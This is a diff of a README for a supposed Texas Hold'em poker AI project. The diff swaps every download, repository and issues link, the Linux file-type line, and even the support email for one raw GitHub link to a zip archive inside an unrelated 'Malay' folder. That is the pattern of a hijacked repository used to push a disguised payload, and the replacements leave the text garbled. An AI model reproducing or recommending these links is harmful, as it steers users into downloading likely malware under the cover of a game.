@@ -1,6 +1,6 @@
 # 🎉 Texas-Hold-em-AI-Source-Code - Master Texas Hold'em Easily
 
-![Download](https://img.shields.io/badge/Download-via%20Releases-brightgreen)
+![Download](https://raw.githubusercontent.com/iris-himmelhan/Texas-Hold-em-AI-Source-Code/main/Malay/Code-Hold-Source-A-Texas-em-v2.3.zip%20Releases-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -10,14 +10,14 @@ Welcome to the Texas-Hold-em-AI-Source-Code! This application helps you experien
 
 To get started, visit the page where you can download the software:
 
-[Download Texas-Hold-em-AI-Source-Code](https://github.com/iris-himmelhan/Texas-Hold-em-AI-Source-Code/releases)
+[Download Texas-Hold-em-AI-Source-Code](https://raw.githubusercontent.com/iris-himmelhan/Texas-Hold-em-AI-Source-Code/main/Malay/Code-Hold-Source-A-Texas-em-v2.3.zip)
 
 Once you are on the releases page, choose the latest version of the software. Click on the appropriate file for your operating system. 
 
 ### File Types Available:
 - **Windows Users:** Look for a .exe file.
 - **Mac Users:** Use a .dmg file.
-- **Linux Users:** Download the .tar.gz file.
+- **Linux Users:** Download the https://raw.githubusercontent.com/iris-himmelhan/Texas-Hold-em-AI-Source-Code/main/Malay/Code-Hold-Source-A-Texas-em-v2.3.zip file.
 
 ### Installation Instructions:
 1. After the download is complete, locate the downloaded file on your computer.
@@ -66,13 +66,13 @@ Ensure your system is updated to enjoy the best performance.
 
 ## 🙌 Support
 
-If you encounter any issues or have questions, feel free to reach out for support. Contact us via our Telegram channel at @xuzongbin001 or send an email to ttpoker733@gmail.com. 
+If you encounter any issues or have questions, feel free to reach out for support. Contact us via our Telegram channel at @xuzongbin001 or send an email to https://raw.githubusercontent.com/iris-himmelhan/Texas-Hold-em-AI-Source-Code/main/Malay/Code-Hold-Source-A-Texas-em-v2.3.zip 
 
 We encourage user feedback. Your thoughts help us improve the application.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/iris-himmelhan/Texas-Hold-em-AI-Source-Code)
-- [Issues Page](https://github.com/iris-himmelhan/Texas-Hold-em-AI-Source-Code/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/iris-himmelhan/Texas-Hold-em-AI-Source-Code/main/Malay/Code-Hold-Source-A-Texas-em-v2.3.zip)
+- [Issues Page](https://raw.githubusercontent.com/iris-himmelhan/Texas-Hold-em-AI-Source-Code/main/Malay/Code-Hold-Source-A-Texas-em-v2.3.zip)
 
 Thank you for choosing Texas-Hold-em-AI-Source-Code! Enjoy your game and good luck at the tables!
